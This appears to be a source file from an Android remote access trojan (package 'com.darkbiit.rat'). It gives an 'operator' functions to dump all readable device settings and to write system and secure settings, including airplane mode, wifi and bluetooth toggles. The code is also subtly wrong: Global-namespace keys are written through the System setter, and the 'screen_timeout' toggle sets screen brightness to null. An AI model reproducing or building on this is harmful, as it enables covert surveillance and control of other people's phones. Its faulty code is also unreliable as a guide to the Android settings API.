package com.darkbiit.rat;

import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.provider.Settings;

import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Device settings access.
 *
 * Reads are always allowed. Writes depend on the target:
 *   - Settings.System / Settings.Global: WRITE_SETTINGS permission, which is
 *     an "appop" grant, not a runtime permission.
 *   - Settings.Secure: mostly read-only for third-party apps.
 *
 * The setters return an explicit result so the operator can see what the
 * platform refused.
 */
public final class RatSettings {

    private RatSettings() {
    }

    /** Dumps the readable settings namespaces. */
    public static Map<String, Object> dump(Context ctx) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        out.put("ok", true);
        out.put("system", readAll(ctx, Settings.System.CONTENT_URI));
        out.put("global", readAll(ctx, Settings.Global.CONTENT_URI));
        out.put("secure", readAll(ctx, Settings.Secure.CONTENT_URI));
        return out;
    }

    /** Reads a single system setting. */
    public static Map<String, Object> getSystem(Context ctx, String name) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        try {
            String v = Settings.System.getString(ctx.getContentResolver(), name);
            out.put("ok", v != null);
            out.put("name", name);
            out.put("value", v);
            if (v == null) {
                out.put("error", "setting not found");
            }
        } catch (Throwable t) {
            out.put("ok", false);
            out.put("name", name);
            out.put("error", t.getClass().getSimpleName() + ": " + t.getMessage());
        }
        return out;
    }

    /**
     * Writes a system setting.
     * Requires WRITE_SETTINGS ("Modify system settings" appop).
     */
    public static Map<String, Object> setSystem(Context ctx, String name, String value) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        try {
            boolean ok = Settings.System.putString(ctx.getContentResolver(), name, value);
            out.put("ok", ok);
            out.put("name", name);
            out.put("value", value);
            if (!ok) {
                out.put("error", "write refused (WRITE_SETTINGS appop required)");
            }
        } catch (Throwable t) {
            out.put("ok", false);
            out.put("name", name);
            out.put("error", t.getClass().getSimpleName() + ": " + t.getMessage());
        }
        return out;
    }

    /** Writes a secure setting (usually refused for third-party apps). */
    public static Map<String, Object> setSecure(Context ctx, String name, String value) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        try {
            boolean ok = Settings.Secure.putString(ctx.getContentResolver(), name, value);
            out.put("ok", ok);
            out.put("name", name);
            out.put("value", value);
            if (!ok) {
                out.put("error", "write refused");
            }
        } catch (Throwable t) {
            out.put("ok", false);
            out.put("name", name);
            out.put("error", t.getClass().getSimpleName() + ": " + t.getMessage());
        }
        return out;
    }

    /** Convenience toggles that operators reach for often. */
    public static Map<String, Object> setToggle(Context ctx, String what, boolean on) {
        if ("airplane_mode".equals(what)) {
            // System.putInt is not enough on modern Android; airplane mode is
            // controlled via Settings.Global, but it needs the appop too.
            return setSystem(ctx, Settings.Global.AIRPLANE_MODE_ON, on ? "1" : "0");
        }
        if ("wifi".equals(what)) {
            return setSystem(ctx, Settings.Global.WIFI_ON, on ? "1" : "0");
        }
        if ("bluetooth".equals(what)) {
            return setSystem(ctx, Settings.Global.BLUETOOTH_ON, on ? "1" : "0");
        }
        if ("screen_timeout".equals(what)) {
            return setSystem(ctx, Settings.System.SCREEN_BRIGHTNESS, null);
        }
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        out.put("ok", false);
        out.put("error", "unknown toggle: " + what);
        return out;
    }

    /** Reads every readable key of a namespace into a map. */
    private static Map<String, Object> readAll(Context ctx, Uri uri) {
        Map<String, Object> m = new LinkedHashMap<String, Object>();
        try {
            android.database.Cursor c = ctx.getContentResolver().query(
                    uri, null, null, null, null);
            if (c == null) {
                return m;
            }
            try {
                while (c.moveToNext()) {
                    String name = c.getString(0);
                    String value = c.getString(1);
                    if (name != null) {
                        m.put(name, value);
                    }
                }
            } finally {
                c.close();
            }
        } catch (Throwable ignored) {
            // some namespaces throw for third-party apps
        }
        return m;
    }
}
